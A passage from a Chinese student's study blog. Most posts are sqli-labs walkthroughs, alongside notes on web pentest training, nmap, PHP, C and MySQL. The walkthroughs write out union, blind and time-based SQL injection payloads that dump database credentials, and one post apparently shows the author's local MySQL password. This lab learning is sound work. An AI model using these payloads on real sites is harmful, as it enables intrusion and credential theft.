剩下的和lesson11一样。 lesson13：通过查看源码，或在网页上输入错误sql语法，可知注入点为：‘） 但是登入成功后我们看不到页面有回显数据，那么这题要采用盲注（参考第五关、第八关）。 lesson14：通过查看源码，或在网页上输入错误sql语法，可知注入点为 ：” 但是登入成功后我们看不到页面有回显数据，那么这题要采用盲注（参考第五关、第八关）。 lesson15：无法通过sql语法错误来检测数据库闭合参数类型， 查看源码： 1@$sql=&quot;SELECT username, password FROM users WHERE username=&#x27;$uname&#x27; and password=&#x27;$passwd&#x27; LIMIT 0,1&quot;; 注入点为：’ ； 登入成功，无回显，盲注（参考第五关、第八关）。 lesson16：做这关的时候放了一个错误卡了好久：把“）型的双引号用两个单引号代替了，导致一直输入返回值错误。 查看源码可得注入点为：”)； 登入成功，无回显，盲注（参考第五关、第八关）。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"2021.1月web渗透培训","date":"2021-01-27T02:56:06.000Z","path":"2021/01/27/2021-1月web渗透培训(1)/","text":"web渗透的宏观思路：a.信息收集b.漏洞挖掘c.漏洞利用d.输出渗透测试报告一.信息收集1.基本信息： 《域名信息，子域名，ip地址，同IP的其他网站信息–站长之家； ​ 获取子域名–子域名挖掘机 ​ 获取域名或IP地址–http://viewdns.info、https://www.dnsdb.io ​ 根据IP地址查询同一IP地址的其他信息–http://114best.com/ip/114.aspx?w= 《端口：80（http）443（HTTPS） 445（共享文件夹）； 《服务（web版本），服务版本； 2.os操作系统版本： linux，wind，mac 3.web中间件（web程序，用来提供网页服务） Apache（主流），iis，Nginx，weblogic 4.数据库 类型、版本：mysql，mssql，oracle，access 5.服务器后端的脚本类型、版本 PHP、JSP、ASP ~端口扫描技术–NMAP基本命令格式：nmap -参数 ip/ip段/主机地址 Nmap TCP扫描端口选项:-sP：用ping的方式判断是否有存活主机,不扫描端口。-sT：使用TCP连接扫描，对目标主机所有端口进行完整的三次握手，如果成功建立连接则端口是开放的。-sS：使用半开连接（SYN stealth)扫描，使用SYN标记位的数据包进行端口探测，收到SYN/ACK包则端口是开放的，收到RST/ACK包则端口是关闭的。-sA：TCP ACK扫描使用ACK标志位数据包，若目标主机回复RST数据包，则目标端口没有被过滤（用于发现防火墙的过滤规则)。 Nmap UDP扫描端口选项:-sU使用UDP数据包经行扫描，返回UDP报文，则端口是开放的;返回不可达则端口处于关闭或过滤状态。 Nmap目标端口选项:-p：扫描指定的端口-F：快速扫描100个常用的端口-r：顺序扫描，按从小到大的顺序进行端口扫描 Nmap输出选项:-oN：标准输出为指定的文件-oX：生成XML格式文件可以转换成HTML文件 其他常用选项:-sV：检测服务端软件版本信息-O：检测操作系统信息-Pn：禁用nmap的主机检测功能-A：探测服务版本、对操作系统进行识别、进行脚本扫描、进行路由探测 注：nmap -sP ip段可检测该网段下所有存活的主机 本章参考ppt：https://kdocs.cn/l/ctOPJlaBJgUw","tags":[{"name":"web渗透","slug":"web渗透","permalink":"http://example.com/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"2021-1月web渗透培训(2)","date":"2021-01-27T02:56:06.000Z","path":"2021/01/27/2021-1月web渗透培训(2)/","text":"SQL注入原理（web漏洞）： 将用户的输入当作代码/指令，在数据库中操作、执行 例如：用户名：admin 密码：123 正常带入数据库中执行：select *from users where username=‘admin’ and password=‘123’–返回正确，成功登入； 利用SQL注入： 构造payload：用户名：admin‘ or ’1‘=’1 密码=‘随意’； 带入数据库中执行：select *from users where username=‘admin‘ or ’1‘=’1’ and password=‘随意’–返回正确，成功登入；我们可以看到数据库误把用户的输入当做代码，整合到源码中，1=1恒成立故导致该语句恒成立。 注：数据库中 ‘ = ’ 优先级高于 ‘and’ 高于 ‘or’； 预防SQL注入：过滤用户的特殊输入（关键字：and等，字符：‘ 等），预编译（将用户的输入当作字符串，即不数据库不会执行夹杂在用户输入的代码中）； 判断是否存在SQL注入漏洞： (1)?id=1’ –页面是否报错 (2)?id=1’ and ‘1’=’1–页面是否正常 (3)?id=1’ and ‘1’=’2–页面是否异常 若(1)报错(2)正常(3)异常则说明存在SQL注入漏洞。 参考ppt：https://kdocs.cn/l/crYKxbz6UgjE 密码goktech","tags":[{"name":"web渗透","slug":"web渗透","permalink":"http://example.com/tags/web%E6%B8%97%E9%80%8F/"}]},{"title":"PHP语法","date":"2021-01-25T04:18:49.000Z","path":"2021/01/25/PHP语法/","text":"PHP标记：我们主要使用&lt; ?php ?&gt; ； PHP中的分隔符：1、PHP中的“结构定义语句”（分支，循环，类，函数等{}结尾），不需要使用分号结尾。2、PHP中的“功能执行语句”，不用{}结尾的，必须使用分号结尾。 PHP中的变量：1.PHP是一种弱类型语言。变量无需声明，直接给变量赋值即可，并且可以在后续赋值过程中随时修改变量的数据类型。 2.PHP中可以使用连等同时声明多个变量，而不能使用逗号分隔。eg：$a=$b=$c=10 sp：PHP语法学习详情参考：https://www.cnblogs.com/suitongyu/p/7748153.html","tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"}]},{"title":"C语言的解题思路","date":"2020-12-24T08:41:40.000Z","path":"2020/12/24/blog9/","text":"前言学习C语言的过程中明显感觉到个人最吃力的是：拿到一道题，怎么把题目目的转化为代码。这是最难的，感觉数学思维能力要比较高。于是我想把一些解题思路保留记录下来，方便日后复习巩固。1.绝对偏差最小问题。 【题目】 输入某班级n(0&lt;n&lt; 100)个学生的成绩到数组a中，查找出所有成绩中与及格线(60分)绝对偏差最小的学生成绩，并输出该学生的成绩。 【思路】 先定义一个数组a[100],用for语句算出每一个数与60差的绝对值，然后定义一个变量m去存储最小绝对偏差值，同时用定义变量k去记存当绝对偏差值最小时i的值。","tags":[{"name":"C语言学习","slug":"C语言学习","permalink":"http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"lesson9、lesson10","date":"2020-12-13T14:20:36.000Z","path":"2020/12/13/blog j/","text":"lesson9这题很有意思，我发现不管输入什么，返回值都是you are in，于是我查看源代码—— 123456789101112131415161718if($row) &#123; echo &#39;&lt;font size&#x3D;&quot;5&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;; echo &#39;You are in...........&#39;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;&#x2F;font&gt;&quot;; &#125; else &#123; echo &#39;&lt;font size&#x3D;&quot;5&quot; color&#x3D;&quot;#FFFF00&quot;&gt;&#39;; echo &#39;You are in...........&#39;; &#x2F;&#x2F;print_r(mysql_error()); &#x2F;&#x2F;echo &quot;You have an error in your SQL syntax&quot;; echo &quot;&lt;&#x2F;br&gt;&lt;&#x2F;font&gt;&quot;; echo &#39;&lt;font color&#x3D; &quot;#0000ff&quot; font size&#x3D; 3&gt;&#39;; &#125;&#125; 我们可以看到不论输入结果正确与否输出都为you are in 通过题目我们知道注入点为 ’ 于是我觉得可以利用时间盲注，通过延时判断语句正确与否，于是输入爆库语句—— 1?id&#x3D;1&#39; and If(substr(database(),1,1)&#x3D;&#39;e&#39;,sleep(5),1)--+ 发现可行，那么剩下的内容和lesson8就一模一样了。 lesson10这题基于lesson9，但注入点有别于lesson9为 ‘’ 其余的也一样了。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lessen8","date":"2020-12-13T07:23:18.000Z","path":"2020/12/13/blog i/","text":"一.爆库首先输入—— 1?id&#x3D;1--+ 页面回显you are in 接着打开源码查看到—— 1$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;; 则注入点为 ‘ ，输入语句—— 1?id&#x3D;0&#39; or 1&#x3D;1--+ 回显正确。那么这时我觉得这和lesson5有什么区别呢？查看源代码发现—— 1&#x2F;&#x2F;print_r(mysql_error()); 他对mysql报错语句进行了注释，即这关不能用报错注入。 于是我用布尔盲注，我发现不管我输入语句判断正确与否他返回的都是you are in那么说明我们想要使用布尔盲注也是不行的。那么最后尝试一下时间盲注，输入语句—— 123?id&#x3D;1&#39;and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))--+或?id&#x3D;1&#39;and If(substr(database(),1,1)&#x3D;&#39;s&#39;,1,sleep(5))--+ 发现可以行得通，那么本题使用时间盲注无疑了。 二.爆表输入语句—— 1?id&#x3D;1&#39;and If(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39;limit 0,1),1,1)&#x3D;&#39;e&#39;,1,sleep(5))--+ 三.爆列输入语句—— 1?id&#x3D;1&#39;and If(substr((select column_name from information_schema.columns where table_schema&#x3D;database()limit 0,1),1,1)&#x3D;&#39;i&#39;,1,sleep(5))--+ 四.爆值输入语句—— 1?id&#x3D;1&#39; and if(substr((select username from users limit 0,1),1,1)&#x3D;&#39;D&#39;,1,sleep(5)) --+","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"mysql","date":"2020-12-07T08:25:42.000Z","path":"2020/12/07/数据库的增删改查/","text":"一.MySQL的增删改查语句。1.增：有四种方法a.使用insert插入单行数据；语法格式为insert into 表名（列名） values （’列值’）； 例如：insert into lcj（姓名，班级，座号）values （‘小林’，‘网安一班’，‘30’）； b.insert 表名 set 列名=‘列值’，列名=‘列值’…….. 注：增加的列值是填充在新一行。 2.删：a.使用delete删除数据；语法格式为delete from 表名 ；可在表名后面加where语句来充当条件语句。例如：delete from lcj where name=‘小林’；译为删除表lcj中列值为小林的行（注意：是一整行！）3.改：a.运用update对原1列值进行改动；语法update 表名 set 列名=更新值；例如：update lcj set 座号=1；可在更新值后面加where语句来充当条件语句；4.查：a.查表中的所有数据：select *from 表名；b. 二.MySQL语句使用练习。1.建立数据库：create database class character set gbk; 其中class为数据库名。 2.使用数据库：use class； 3.创建表：create table a（列名 数据类型）；其中a为表名。 如：{ create table class(name varchar(20)); } 4.查看表数据（值）：select *form a； 5.查看表结构：desc a； 三.特殊的增加列：alter table 表名 add 列名 列值类型 约束； 将旧表的内容复制到新表：insert into less42 select *from users 附：MySQL增删改查语句学习资料https://www.iteye.com/blog/sakyone-365147 四.数据库alter的用法：1：删除列 ALTER TABLE 【表名】 DROP 【列名】 2：增加列 ALTER TABLE 【表名】 ADD 【列名】 【类型】alter table table1 add transactor varchar(10) not Null; 3：重命名列 ALTER TABLE 【表名】 CHANGE 【列名】【新名】 4：修改表字段 alter table 表名称 change 字段名称 字段新名称 字段新类型 [是否允许非空];alter table 表名称 modify 字段名称 字段新类型 [是否允许非空]; 5：查询表的字段信息 desc 表名称; 6：创建索引 ALTER TABLE tbl_name ADD INDEX index_name (column list); 7：删除索引 ALTER TABLE tbl_name DROP INDEX index_name (column list); 8：修改表名 ALTER TABLE 表名 rename 新表名; 原文链接：https://blog.csdn.net/sinat_36053757/article/details/83380684","tags":[{"name":"数据库的增删改查","slug":"数据库的增删改查","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/"}]},{"title":"第六章","date":"2020-12-01T13:08:21.000Z","path":"2020/12/01/blog8/","text":"一.指针与指针变量1.指针就是变量的地址。 2.指针变量的定义：类型标识符 *标识符；如：int *p。这句话将p定义为指针变量；p代表一个地址。 注：a.一个指针变量只能指向类型相同的变量。 ​ b.如果存在“int i， *p=&amp;i（定义的p为指针变量的同时将i的地址赋值给p，指针变量p就指向了i，即 *p等价于i）；”。那么 *p等价于i等价于 *&amp;i；&amp; *p等价于&amp;i等价于p。观察发现指针运算符和取地址符共同作用时，会相互抵消。 二.指针运算1.指针运算符“ * ”与自增，自减运算符均为单目运算，运算级相同，则运算方向为自右向东。 三.指针和二维数组 1.假设a为二维数组，a既是数组名也是二维数组的首地址，相当于a[0] [0]。a+1表示a[1] [0];*a+1表示a[0] [1]。 2.假设有程序语句： 12int a[3] [5] , (*p)[5],i,j;p&#x3D;a; 则存在以下等阶：（p[i]+j) 等于 * (* (p+i)+j) 等于 ((p+i ) )[j] 等于 p[i] [j] 等于 a[i] [j] 。 3.假设有程序语句： 12int a[3] [5],i,j,*p[3];for (i&#x3D;0;i&lt;3;i++) p[i]&#x3D;a[i];&#x2F;&#x2F;p[i] 相当于每一行的首地址 则存在以下等阶：*(p[i]+j) 等于 *( *(p+i)+j) 等于 ( *(p+i )) [ j ] 等于 p[i] [j] 等于 a[i] [j]。 三.复合1.指向指针的指针变量定义：语法格式：类型标识符 ** 指针变量名。 **指针变量名等阶于 *( *指针变量名) 2.指向结构体数组的指针变量:1234567891011121314struct booktp &#123; char name[60]; char author[30]; float price; struct datetp &#123; unsigned year; unsigned month; &#125;pubday; &#125;; struct booktp *p,book[3]; p&#x3D;book;&#x2F;&#x2F;p指向book的首地址，即book[0]; 且book[0].price &#x3D; p-&gt;price &#x3D; (*p).price","tags":[{"name":"C语言学习","slug":"C语言学习","permalink":"http://example.com/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"}]},{"title":"lesson7","date":"2020-11-29T08:49:29.000Z","path":"2020/11/29/blog g/","text":"一.预备1.利用load_flie()函数导出文件： load_file(file_name):读取文件并返回该文件的内容作为一个字符串。 注.使用条件： a.必须有权限读取并且文件必须完全可读。当文件不存在或者没有权限访问时函数的返回值为空。 b.欲读取文件必须在服务器上。 c.必须指定文件完整的路径。 d.欲读取文件必须小于 max_allowed_packet。 二.lesson7实战A.查找注入点：查询源代码—— 1$sql&#x3D;&quot;SELECT * from users where id&#x3D;((&#39;$id&#39;)) limit 0,1&quot;; 我们可以得知注入类型为：’)) 构造语句—— 1?id&#x3D;0&#39;)) or 1&#x3D;1--+; 返回正常。 B1.数据库中导出文件遇到问题：输入语句—— 1?id&#x3D;1&#39;))union select 1,2,database() into outfile &quot;D:\\\\phpstudy_pro\\\\www\\\\sqli-labs\\\\Less-7\\\\1.txt&quot;--+ 在指定目录下未生成相应名为“1”的文件 由前人指点：mysql最初对文件的导入和导出有限制，因此应当先取消该限制 在mysql数据库中执行语句—— 1show variables like &quot;secure_file_priv&quot;; 发现本地value的值为NULL。NULL表示禁止。即禁止将产生的文件导入mysql目录下（注：如果这里value值有文件夹目录，则表示只允许该目录下文件。如果为空，则表示不限制目录。） 既然问题找到了，那就解决它——去掉导入目录的限制：在mysql配置文件my.ini中加入语句—— 1secure_file_priv &#x3D; 然后重启mysql，在执行上述语句则在指定目录下找到指定文件。 由于我们刚刚没有规定产生的文件导出到哪里，因此在导出文件时要表明目录地址。 在mysql数据库中输入语句—— 1select *from users into outfile &quot;D:\\\\phpstudy_pro\\\\www\\\\sqli-labs\\\\Less-7\\\\1.txt&quot;; 则可在指定目录下找到该文件，得到users的全部内容。（注文件一定要是导出目录下不存在的新名字文件） B2.在B1的操作之后就可以开始常规流程：1.爆库 1?id&#x3D;1&#39;))union select 1,2,database() into outfile &quot;D:\\\\phpstudy_pro\\\\www\\\\sqli-labs\\\\Less-7\\\\1.txt&quot;--+ 点开1.txt的文件可以发现里面包含数据库名 2.爆表 1?id&#x3D;-1&#39;))union select 1,2,table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; into outfile &quot;D:\\\\phpstudy_pro\\\\www\\\\sqli-labs\\\\Less-7\\\\2.txt&quot;--+ 点开2.txt的文件可以发现里面包含库名为security下的所有表的表名 3.爆列 1?id&#x3D;-1&#39;))union select 1,2,column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; into outfile &quot;D:\\\\phpstudy_pro\\\\www\\\\sqli-labs\\\\Less-7\\\\3.txt&quot;--+ 点开3.txt的文件可以发现里面包含库名为security下表名为usesr的列的所有列名 4.爆值 1?id&#x3D;-1&#39;))union select *from users into outfile &quot;D:\\\\phpstudy_pro\\\\www\\\\sqli-labs\\\\Less-7\\\\4.txt&quot;--+ 点开4.txt的文件可以发现里面包含库名为security下表名为usesr的所有数据值。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"MySQL","date":"2020-11-28T14:35:29.000Z","path":"2020/11/28/blog f/","text":"一.基本的使用 1.查看有哪些数据库：show database； 2.调用security数据库：use security； 3.查看被调用的数据库中有哪些表名：show tables； 4.查看表的结构，如：desc email； 5.查看表的内容：select *form 表名；","tags":[{"name":"mysql数据库的使用","slug":"mysql数据库的使用","permalink":"http://example.com/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/"}]},{"title":"lesson5&lesson6","date":"2020-11-20T08:15:38.000Z","path":"2020/11/20/blog e/","text":"lesson5A.sql布尔盲注一.寻找注入点输入?id=1返回正常；输入?id=1’返回报错；确认注入点：输入?id=0’ or 1=1–+，返回正常，说明此题‘为注入点。 二.爆库（遇到挫折）通过输入之前学过的爆库语句发现得到的返回值只有you are in，无法显示出数据库名。所以要学习一种新的注入方法：盲注。 A.函数left（）函数：left（a，b）即从左侧截取字符串a的前b位，例如left（database（），1），database（）显示数据库名称（为字符串），即译为截取数据库名称的第一位数。substr（）函数：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度，取到的值包括b位置对应字符本身。同mid（）函数。ascii()函数：将某个字符转换 为 ascii 值 。同ord（）函数。length（）函数：获取数据库长度。如?id=1’and length(database())=n–+当n的值等于数据库名称字符串长度时，返回正常，反之报错B.猜测数据库名称猜测数据库名称第一位–输入语句：?id=1‘and left(database(),1)&gt;’a’–+ ，若返回正常，则说明数据库名称首字母大于a，反之则说明数据库首字母为a。然后使用二分法将a换成m，继续观察返回结果，重复使用二分法，直到可以确定出字母为止。猜测数据库名称第二位–输入语句?id=1’and left(database(),2)&gt;’sa’–+ ,若返回正常，则说明数据库名称第二位字母大于a，反之则说明数据库名称第二位字母为a。然后使用二分法将a换成m，继续观察返回结果，重复使用二分法，直到可以确定出字母为止。猜测后续字母值同上，重复使用语句即可获得数据库名称“security”。三.爆表！首先要先了解一下ascii码表，用于构建注入语句。a.爆第一个表：输入语句?id=1‘and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1）,1，1)) &gt;65 –+ 。注：1.limit 0,1的意思是从第1行开始，获取这一行的返回值。而此处的意思是获取数据库的第一个表的表名。{substr((select table_name from information_schema.tables where table_schema=database() limit 0,1）}即获取数据库的第一个表的表名。其在substr（a，b，c）中充当a的值。2.整个输入语句的意图是：通过ascii码转换，猜测数据库的第一个表表名的首字母。为了猜测得到表名第二位字母，仅需将substr（a,b,c)中的1改为2。后续字母以此类推，可得数据库第一个表的表名。3.猜测的过程同样采用二分法。b.爆第二个表：仅需把a中输入语句的limit 0,1改成limit 1,1。其余照部就搬。四.爆列如猜测users表中是否存在username列，输入语句：?id=1’ and 1=(select 1 from information_schema.columns where table_name=’users’ and column_name regexp ‘^username’ limit 0,1)–+返回正常，则说明users表中存在username列。证明其他列是否存在也可用上述方法，仅需变换列名。五.爆值如输入语句?id=1’ and ord mid((select ifunll(cast(username as char),0x20)form security.users order by id limit 0,1),1,1))=68–+ 。意思是获取username列中第一行的第一个字符的对应ascii码的数值与68比较，以确认其值。其余操作都是按部就搬上面。B.*sql报错注入C.*sql延时注入预备：时间盲注多与if（expr1,expr2,expr3）结合使用，此if语句的用法是：如果expr1是true，则if（）的返回值为expr2；否则返回expr3.关于sleep函数：https://blog.csdn.net/zyz511919766/article/details/42241211 1.利用sleep（）函数进行注入：?id=1’and If(ascii(substr(database(),1,1))=115,1,sleep(5))–+当错误的时候网页会有五秒的延迟。总结：在本题学习时学习了sql盲注之正则表达式攻击。我们可以使用正则表达式攻击法获得表名或列名。1.如判断第一个表名的第一个字符是否是a-z中的字符，输入语句：?id=1’ and 1=(select 1 from information_schema.tables where table_name=’security’ and table_name regexp ‘^[a-z]’ limit 0,1)–+2.如判断第一个字符是否是a-n中的字符，输入语句：?id=1’ and 1=(select 1 from information_schema.tables where table_name=’security’ and table_name regexp ‘^[a-n]’ limit 0,1)–+3.如确定一个数是n：?id=1’ and 1=(select 1 from information_schema.tables where table_name=’security’ and table_name regexp ‘^n’ limit 0,1)–+4.自己在后续的做题时发现布尔盲注法用起来很鸡肋，因为如果页面一直回显给你you are in那么你就无法确定注入语句是否正确。lesson6由题目可知：这是双注入双引号型。我们通过查找源代码： 12$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;; 易知本题的注入点仅需把lesson5的注入点 ‘ 改为 “ 即可，其余按部就班。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson2，lesson3，lesson4","date":"2020-11-16T14:04:05.000Z","path":"2020/11/16/blog d/","text":"一.找注入点由题目提示：注入点为整数。 试探：输入?id=1返回正常；输入?id=0返回异常；且输入?id=0 or 1=1–+得到的返回值正确。故该处存在sql注入点。 二.判断字段数 输入?id=1 order by n–+直到输入n=4时返回错误。故数据库中存在3个字段。 三.爆开数据库：得到数据库名 输入?id=0 uion select 1,2,database()–+语句 四.爆开数据表：得到数据表名 输入?id=0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() –+语句。 注：table_schema=database()赋值语句，即列出数据库中的表名 五.爆开数据列：得到数据列名 输入?id=0 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ –+语句 六.爆开数据值 输入?id=0 union select 1,group_concat(username,0x3a,password),3 from users–+语句。 七.总结：lesson1—4的爆库方法基本一致，只有在注入点上略有不同。","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"lesson1","date":"2020-11-14T13:07:05.000Z","path":"2020/11/14/blog c/","text":"前言：这是第二次写lesson1的blog，万事开头难。 一.寻找sql注入点 根据标题提示该sql注入点为单引号。输入?id=1’返回值错误；输入?id=1返回值正常。故存在注入点。 注：1.（自己的摸索）：发现输入id=非正整数如（?id=-1）时，页面返回为空。这是因为这些数值不在数据库范围之内，故返回为空。 2.不是所有引起报错的点都是注入点，也可能是由于单纯的语法错误导致了页面报错。而当存在一个真正的注入点时，输入?id=0+注入点+or 1=1–+语句返回值正常，反之报错。 二.查询字段数 利用order by语句。?id=1%27%20order%20by%20n–+（n为正整数，不断改变n的值通过观察返回状态确定字段数）如： 输入?id=1%27%20order%20by%201–+，返回正常。 输入?id=1%27%20order%20by%204–+，返回异常。 当输入到第n-1个正常，第n个不正常时，说明拥有n-1个字段数。 注：字段数就是sql数据库中存在变量数的个数。 三.union select看返回值 1.利用union select语句查看字段数返回值。?id=-1%27union%20select%201,2,3–+。 只有2,3代表的回显位能被观察到，即用户从浏览器上反馈看见的只有2,3回显位。 2.利用union select语句查看数据库返回值。 输入?id=-1%27union%20select%201,database(),2–+. 由此可知：database的名称为security。 注意使用union select 四.查表 1.输入?id=-1’ union select 1 ,2,group_concat(table_name) from information_schema.tables where table_schema=‘sercurity’–+即可查获在sercurity数据库中的表单名。 注：对于理解该代码：group_concat(table_name) ：group_concat函数是典型的字符串连接函数；from information_schema.tables：来自信息图表数据库中的表单。where table_schema=‘sercurity’其中where为限制词，where table_schema=‘sercurity’:寻找范围在数据库名为sercurity中。 ps:为了方便在页面上看到自己在url里输入的内容可以在index文件里加一句echo &quot; $sql&lt; br &gt;&quot;; 五.查字段名以及字段数值 1.输入?id=-1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database()–+可查得字段名。 2.输入?id=-1’union select 1,2,group_concat(username,0x3a,password) from users–+可查得每个用户对应的密码（0x3a是字符冒号，：’对应16进制的ASCLL码）","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"sql注入基本知识lesson1","date":"2020-11-10T13:00:12.000Z","path":"2020/11/10/blog b/","text":"一.判断是否存在sql注入的方法1.基础中的基础：get单引号判断在地址栏网址后加**?id=1，显示正常；加?id=1’，显示错误。则说明存在sql注入点。且‘**的url编码是%27. 2.get and判断输入?id=-1 and 1=1 正常； 输入?id=-1&#39;and 1=2 报错；存在sql。 总结：在请求字符串或id参数后加’，是一种基本检测是否存在sql注入的方法。 3.Or、xor判断同get and判断 4.sql运算符判断5.通过sleep函数演示显示的形式进行判断6.服务端返回错误形式7.了解post、get、编码# 是sql语句中的注释符； + 在http请求中表示空格； -- 后面的语句相当于被注释掉,不执行后面的sql语句； --+代表闭合sql查询语句，如果没加，无法形成有效的mysql语句。 在post参数中，要加空格符时，直接输入空格符即可；用+会被http请求转义为%23编码； 在get请求中，如果想使用空格，需要用空格符编码%20来替代，不然会请求报错；如果使用#，则#后面的参数不会提交到服务器，但如果使用编码%23即可提交到服务器。 常见的url编码：空格 ：%20 ； + ：%2B； &lt; ：%3C； &gt; ：%3E ‘ : %27 #： %23 8.sql注入常用函数1.order by：该函数对结果集进行排序，用于猜测字段数。例如输入?id=1’ order by 3 –+显示正常；输入?id=1’ order by 4 –+显示错误。故得出在?id=1查看的表有3个字段 二.确认字段数确认字段数可以使用order by语句，例如：?id=1’ order by 4 %23 时报错!","tags":[{"name":"sqlilabs","slug":"sqlilabs","permalink":"http://example.com/tags/sqlilabs/"}]},{"title":"MYSQL","date":"2020-11-09T13:29:45.000Z","path":"2020/11/09/MYSQL数据库/","text":"1.MYSQL注入在线靶场https://www.anquanlong.com/lab_detail?lab_id=3&amp;lib=1 个人用phpstudy搭建本地靶场。 2.更改root密码时应该同时修改网址的根目录下对应文件中的密码。如sql-connections文件中。 MYSQL数据库的使用1.在D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\bin目录下打开，输入语句./mysql.exe -uroot -p； 2.跳出语句让你输入密码（lcj20020425）； 3.输入查询语句，语句以；结尾。","tags":[{"name":"MySQL数据库的搭建与启动","slug":"MySQL数据库的搭建与启动","permalink":"http://example.com/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/"}]},{"title":"第五章汇总（1）","date":"2020-11-09T11:00:22.000Z","path":"2020/11/09/blog7/","text":"[TOC] 一.函数1.系统运行C语言程序时，从主函数开始计算，当遇到自定义函数时，转到自定义函数进行运算，最后回到主函数完成运算。 2.非主函数的其他函数之间可以相互调用。一个函数调用另一个函数，前者称为主调函数，后者称为被调函数。 3.函数的定义： 类型标识符 函数名（） { ​ 函数体 } 4.类型标识符的作用是定义函数体执行完之后，函数返回值的类型。若省略类型标识符，系统默认函数返回值类型为int型。如果函数无返回值，则用void来定义函数的返回值。 5.函数体一般用return语句来结束，格式如return （表达式）。当程序执行到return语句时，先计算表达式的值，然后程序的流程返回到调用该函数的地方，并将表达式的值作为函数值返回给主调函数。 6.函数的参数传递。a.函数间值传递时，形参的值在被调函数中会改变，而实参的值保持不变。（根本原因是这两者的数据地址不同） ​ b.实参的作用是把函数中的具体数值传递给被调用的函数。且实参个数与顺序要和形参相同，实参和形参对应的数据类型也相同。 具体使用如： 1234567891011121314151617#include&lt;stdio.h&gt; void swap(char x,char y)&#x2F;&#x2F;x,y为形参 &#123; char ch; ch&#x3D;x; x&#x3D;y; y&#x3D;ch; &#125;int main()&#123; char ch1&#x3D;&#39;a&#39;,ch2&#x3D;&#39;b&#39;; printf(&quot;before:ch1&#x3D;%c ch2&#x3D;%c\\n&quot;,ch1,ch2); swap(ch1,ch2);&#x2F;&#x2F;此处的ch1，ch2都是实参 printf(&quot;after:ch1&#x3D;%c ch2&#x3D;%c\\n&quot;,ch1,ch2); return 0; &#125; 输出的结果为： 12before:ch1&#x3D;a ch2&#x3D;bafter:ch1&#x3D;a ch2&#x3D;b 二.地址传递表示地址值的形式有：数组名（注意是数组名不是数组，如数组a[0]则取不到实参地址），&amp;变量，字符串，指针变量。 当使用上述方式进行值传递时，可使形参和实参的地址相同。则当形参的值发生改变时，实参的值也随之发生改变，即数据具有双向性。如： 1234567891011121314151617181920212223#include&lt;stdio.h&gt;int main()&#123; double efunn(double a[2]); double b[2],average; b[0]&#x3D;15.6; b[1]&#x3D;b[0]&#x2F;2; printf(&quot;1--in main:b[0]&#x3D;%3.1f b[1]&#x3D;%3.1f\\n&quot;,b[0],b[1]); average&#x3D;efunn(b);&#x2F;&#x2F;b为数组名 printf(&quot;average&#x3D;%3.1f\\n&quot;,average); printf(&quot;3--in main:b[0]&#x3D;%3.1f b[1]&#x3D;%3.1f\\n&quot;,b[0],b[1]); return 0;&#125; double efunn(double a[2])&#x2F;&#x2F;形参数组可不用定义元素个数，但使用形参数组时要注意不能超过实参数组个数，否则会报错。&#123; double sum,aver; sum&#x3D;a[0]+a[1]; a[0]&#x3D;a[0]+2.5; a[1]&#x3D;a[1]+5.8; aver&#x3D;sum&#x2F;2; printf(&quot;2-in function:a[0]&#x3D;%3.1f a[1]&#x3D;%3.1f\\n&quot;,a[0],a[1]); return (aver);&#125; 运行结果为： 12341--in main:b[0]&#x3D;15.6 b[1]&#x3D;7.82-in function:a[0]&#x3D;18.1 a[1]&#x3D;13.6average&#x3D;11.73--in main:b[0]&#x3D;18.1 b[1]&#x3D;13.6 二维数组与一维数组的关系： a[m] [n] =a[i*n+j]，具体为： 123for (i&#x3D;0;i&lt;m;i++) for (j&#x3D;0;j&lt;n;j++) a[i*n+j] 三.变量1.局部变量：在一个复合语句当中定义的一个变量；全局变量：在函数外部定义的变量，也称为外部变量。当全局变量与局部变量重名时，局部变量有效，而全局变量失效。 2.动态变量：auto| auto int a=1 相当于int a=1 ； 静态变量：static|用类型变量在被调用后不会清除，其值会被保留； 寄存器变量：register 关键词extern:当外部变量不在文件开头定义时，则仅限于定义处到文件结束范围之内使用该变量，若要在作用域范围之外使用全局变量，则可以使用extern关键词来声明外部变量。 